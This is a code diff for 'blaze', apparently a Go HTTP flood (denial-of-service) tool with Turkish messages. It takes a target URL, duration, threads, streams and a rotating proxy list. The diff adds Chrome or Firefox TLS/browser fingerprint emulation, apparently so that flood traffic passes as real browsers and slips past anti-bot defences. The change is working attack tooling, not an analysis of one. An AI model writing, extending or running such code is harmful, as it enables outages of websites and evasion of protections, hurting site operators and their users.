@@ -18,10 +18,12 @@ import (
 
 func main() {
 	if len(os.Args) < 4 {
-		fmt.Println("kullanim: blaze <url> <sure_sn> <thread> [stream] [method] [proxy|proxy_dosya]")
+		fmt.Println("kullanim: blaze <url> <sure_sn> <thread> [stream] [method] [proxy|proxy_dosya] [browser]")
 		fmt.Println("ornek:    ./blaze https://hedef.com 60 64 32")
 		fmt.Println("ornek:    ./blaze https://hedef.com 60 128 50 GET socks5://127.0.0.1:1080")
-		fmt.Println("ornek:    ./blaze https://hedef.com 60 128 50 GET proxies.txt")
+		fmt.Println("ornek:    ./blaze https://hedef.com 60 128 50 GET proxies.txt chrome")
+		fmt.Println()
+		fmt.Println("browser: firefox (default) | chrome")
 		fmt.Println()
 		fmt.Println("proxy dosya formati (satir satir):")
 		fmt.Println("  ip:port")
@@ -54,10 +56,23 @@ func main() {
 		proxyArg = os.Args[6]
 	}
 
-	run(targetURL, durSec, threads, streams, method, proxyArg)
+	browserArg := "firefox"
+	if len(os.Args) >= 8 {
+		browserArg = strings.ToLower(os.Args[7])
+	}
+
+	var profile gofire.BrowserProfile
+	switch browserArg {
+	case "chrome", "ch":
+		profile = gofire.Chrome146
+	default:
+		profile = gofire.Firefox148
+	}
+
+	run(targetURL, durSec, threads, streams, method, proxyArg, profile)
 }
 
-func run(targetURL string, durSec, threads, streams int, method, proxyArg string) {
+func run(targetURL string, durSec, threads, streams int, method, proxyArg string, profile gofire.BrowserProfile) {
 	runtime.GOMAXPROCS(runtime.NumCPU())
 
 	totalConcurrent := threads * streams
@@ -102,7 +117,7 @@ func run(targetURL string, durSec, threads, streams int, method, proxyArg string
 		}
 	}
 
-	client, err := gofire.Emulate(gofire.Firefox148, opts...)
+	client, err := gofire.Emulate(profile, opts...)
 	if err != nil {
 		fmt.Fprintf(os.Stderr, "hata: client olusturulamadi: %v\n", err)
 		os.Exit(1)
@@ -114,8 +129,8 @@ func run(targetURL string, durSec, threads, streams int, method, proxyArg string
 		client.SetProxyRotator(proxyRotator)
 	}
 
-	fmt.Printf("hedef: %s | sure: %ds | thread: %d | stream: %d | toplam: %d | method: %s\n",
-		targetURL, durSec, threads, streams, totalConcurrent, method)
+	fmt.Printf("hedef: %s | sure: %ds | thread: %d | stream: %d | toplam: %d | method: %s | browser: %s\n",
+		targetURL, durSec, threads, streams, totalConcurrent, method, profile)
 	if proxyRotator != nil {
 		fmt.Printf("proxy: %d adet (rotate)\n", proxyRotator.Count())
 	} else if proxyArg != "" {
